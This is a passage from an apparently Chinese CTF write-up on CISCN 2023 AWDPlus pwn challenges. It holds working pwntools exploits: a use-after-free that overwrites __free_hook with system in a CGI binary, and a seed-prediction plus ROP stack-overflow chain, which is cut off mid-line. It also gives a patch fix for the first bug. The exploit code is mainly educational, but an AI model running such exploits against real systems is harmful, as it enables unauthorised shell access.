<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">lss</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span>                  <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s --&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>

<span class="n">context</span><span class="p">.</span><span class="n">arch</span>      <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span>  <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-l</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">130</span><span class="sh">'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">RE</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">remote</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./cgi</span><span class="sh">'</span>
<span class="n">libelf</span> <span class="o">=</span> <span class="sh">''</span>

<span class="nf">if </span><span class="p">(</span><span class="n">binary</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">elf</span>  <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span> <span class="p">;</span> <span class="n">rop</span><span class="o">=</span><span class="nc">ROP</span><span class="p">(</span><span class="n">binary</span><span class="p">);</span><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
<span class="nf">if </span><span class="p">(</span><span class="n">libelf</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">libelf</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
brva 0x0000001C8D
continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>

<span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>


<span class="n">rn</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\r\n</span><span class="sh">'</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">name</span><span class="p">,</span><span class="n">pwd</span><span class="p">,</span><span class="n">size</span><span class="p">):</span>
    <span class="n">data</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">PUT /profile?</span><span class="sh">'</span> <span class="o">+</span> <span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">id=%d</span><span class="sh">'</span> <span class="o">%</span> <span class="n">idx</span><span class="p">)</span> <span class="o">+</span> <span class="n">rn</span>
    <span class="n">data</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span> <span class="o">+</span> <span class="n">rn</span>
    <span class="n">data</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">Content-Type: application/x-www-form-urlencoded</span><span class="sh">'</span> <span class="o">+</span> <span class="n">rn</span> <span class="o">*</span> <span class="mi">2</span>
    <span class="n">data</span> <span class="o">+=</span> <span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">name=%s</span><span class="sh">'</span> <span class="o">%</span> <span class="n">name</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&amp;password=%s</span><span class="sh">'</span> <span class="o">%</span> <span class="n">pwd</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&amp;password_length=%d</span><span class="sh">'</span> <span class="o">%</span> <span class="n">size</span><span class="p">)</span> <span class="o">+</span> <span class="n">rn</span>
    <span class="nf">s</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">name</span><span class="p">,</span><span class="n">pwd</span><span class="p">):</span>
    <span class="n">data</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">POST /profile?</span><span class="sh">'</span> <span class="o">+</span> <span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">id=%d</span><span class="sh">'</span> <span class="o">%</span> <span class="n">idx</span><span class="p">)</span> <span class="o">+</span> <span class="n">rn</span>
    <span class="n">data</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span> <span class="o">+</span> <span class="n">rn</span>
    <span class="n">data</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">Content-Type: application/x-www-form-urlencoded</span><span class="sh">'</span> <span class="o">+</span> <span class="n">rn</span> <span class="o">*</span> <span class="mi">2</span>
    <span class="n">data</span> <span class="o">+=</span> <span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">name=%s</span><span class="sh">'</span> <span class="o">%</span> <span class="n">name</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&amp;password=%s</span><span class="sh">'</span> <span class="o">%</span> <span class="n">pwd</span><span class="p">)</span> <span class="o">+</span> <span class="n">rn</span>
    <span class="nf">s</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">data</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">GET /profile?</span><span class="sh">'</span> <span class="o">+</span> <span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">id=%d</span><span class="sh">'</span> <span class="o">%</span> <span class="n">idx</span><span class="p">)</span> <span class="o">+</span> <span class="n">rn</span>
    <span class="n">data</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span> <span class="o">+</span> <span class="n">rn</span>
    <span class="n">data</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">Content-Type: application/x-www-form-urlencoded</span><span class="sh">'</span> <span class="o">+</span> <span class="n">rn</span> <span class="o">*</span> <span class="mi">2</span>
    <span class="nf">s</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">rm</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">data</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">DELETE /profile?</span><span class="sh">'</span> <span class="o">+</span> <span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">id=%d</span><span class="sh">'</span> <span class="o">%</span> <span class="n">idx</span><span class="p">)</span> <span class="o">+</span> <span class="n">rn</span>
    <span class="n">data</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span> <span class="o">+</span> <span class="n">rn</span>
    <span class="n">data</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">Content-Type: application/x-www-form-urlencoded</span><span class="sh">'</span> <span class="o">+</span> <span class="n">rn</span> <span class="o">*</span> <span class="mi">2</span>
    <span class="nf">s</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="nf">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">name1</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">mepwd1</span><span class="sh">'</span><span class="p">,</span><span class="mh">0x440</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">name2</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">mepwd2</span><span class="sh">'</span><span class="p">,</span><span class="mh">0x440</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">HTTP</span><span class="sh">'</span><span class="p">)</span>

<span class="nf">rm</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">HTTP</span><span class="sh">'</span><span class="p">)</span>

<span class="nf">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">ord=</span><span class="sh">'</span><span class="p">)</span>
<span class="n">x</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="nf">r</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="n">x</span> <span class="o">-</span> <span class="mi">2018272</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
<span class="n">__free_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">__free_hook</span><span class="sh">'</span><span class="p">]</span>
<span class="n">system</span> <span class="o">=</span>    <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">]</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">rm</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="nf">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">p64</span><span class="p">(</span><span class="n">__free_hook</span><span class="p">)[:</span><span class="o">-</span><span class="mi">2</span><span class="p">],</span><span class="sa">b</span><span class="sh">'</span><span class="s">456</span><span class="sh">'</span><span class="p">)</span>

<span class="nf">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span><span class="p">,</span><span class="mh">0x440</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="nf">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)[:</span><span class="o">-</span><span class="mi">2</span><span class="p">],</span><span class="sa">b</span><span class="sh">'</span><span class="s">mepwd2</span><span class="sh">'</span><span class="p">,</span><span class="mh">0x440</span><span class="p">)</span>
<span class="nf">rm</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>


<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<h3 id="fix-2"><span class="me-2">Fix</span><a href="#fix-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>漏洞在 <code class="language-plaintext highlighter-rouge">DELETE /profile</code>​  <code class="language-plaintext highlighter-rouge">free</code>​ 后没有清除堆块指针，导致free 后的堆块 仍然可以被操作，</li>
  <li>
    <p>只需要free 后， 然后再把 bss 段上的指针清空即可</p>
  </li>
  <li>原始程序汇编</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240117124156-grpxp8a.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240117124156-grpxp8a.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240117125643-udsx071.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240117125643-udsx071.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>加固后</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240117125548-44xhae3.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240117125548-44xhae3.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240117125603-mrhwwqg.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240117125603-mrhwwqg.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<div class="language-armasm highlighter-rouge"><div class="code-header">
        <span data-label-text="Armasm"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="nl">lea</span> <span class="nb">r15</span><span class="err">,</span> <span class="nv">qword</span> <span class="nv">ptr</span><span class="o">[</span><span class="mh">0x7060</span><span class="o">]</span>
<span class="nl">mov</span> <span class="nb">r14</span><span class="err">,</span> <span class="o">[</span><span class="nv">rdx</span><span class="o">+</span><span class="nv">r15</span><span class="o">]</span>
<span class="nl">mov</span> <span class="nb">rdi</span><span class="err">,[</span><span class="nb">r14</span><span class="err">+0</span><span class="nb">x28</span><span class="k">]</span>
<span class="nl">call</span> <span class="nf">_free</span>
<span class="nl">mov</span> <span class="nb">rdi</span><span class="err">,</span> <span class="o">[</span><span class="nv">r15</span><span class="o">]</span>
<span class="nl">call</span> <span class="nf">_free</span>
<span class="nl">xor</span> <span class="nb">r14</span><span class="err">,14</span>
<span class="nl">mov</span> <span class="err">[</span><span class="nb">r15</span><span class="err">],</span><span class="nb">r14</span>
</pre></td></tr></tbody></table></code></div></div>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240117130057-b5psqex.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240117130057-b5psqex.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<h2 id="vuln"><span class="me-2">vuln</span><a href="#vuln" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<ul>
  <li>覆盖种子，栈溢出</li>
</ul>

<p>‍</p>

<h3 id="break-3"><span class="me-2">break</span><a href="#break-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">lss</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span>                  <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s --&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span>      <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span>  <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-l</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">130</span><span class="sh">'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">RE</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">remote</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>

<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./vuln</span><span class="sh">'</span>
<span class="n">libelf</span> <span class="o">=</span> <span class="sh">''</span>

<span class="nf">if </span><span class="p">(</span><span class="n">binary</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">elf</span>  <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span> <span class="p">;</span> <span class="n">rop</span><span class="o">=</span><span class="nc">ROP</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="nf">if </span><span class="p">(</span><span class="n">libelf</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">libelf</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="c1">#io = remote()
</span>

<span class="kn">from</span> <span class="n">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="n">time</span>
<span class="n">dll</span> <span class="o">=</span> <span class="nc">CDLL</span><span class="p">(</span><span class="sh">'</span><span class="s">/usr/lib/x86_64-linux-gnu/libc.so.6</span><span class="sh">'</span><span class="p">)</span>

<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Please enter your name:</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
<span class="c1">#gdb.attach(io)
</span><span class="nf">s</span><span class="p">(</span><span class="mi">18</span><span class="o">*</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="p">)</span>
<span class="n">dll</span><span class="p">.</span><span class="nf">srand</span><span class="p">(</span><span class="mh">0x41414141</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
    <span class="n">x</span> <span class="o">=</span> <span class="n">dll</span><span class="p">.</span><span class="nf">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">100</span> <span class="o">+</span> <span class="mi">1</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Guess the random number:</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">p32</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>

<span class="nf">ru</span><span class="p">(</span><span class="sh">"</span><span class="s">You are talented, here</span><span class="sh">'</span><span class="s">s your gift!</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">=</span> <span class="mh">0x38</span> <span class="o">*</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">pop rdi</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">'</span><span class="s">puts</span><span class="sh">'</span><span class="p">])</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">puts</span><span class="sh">'</span><span class="p">])</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x0401261</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>

<span class="n">x</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="nf">r</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="n">x</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">puts</span><span class="sh">'</span><span class="p">]</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">]</span>
<span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span><span class="p">))</span>
<span class="nf">ls</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
<span class="n">pay</span> <span class="o">=</span> <span class="mh">0x38</span> <span class="o">*</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">])</span><span class="o">*</span><span class="mi">1</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">pop rdi</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span 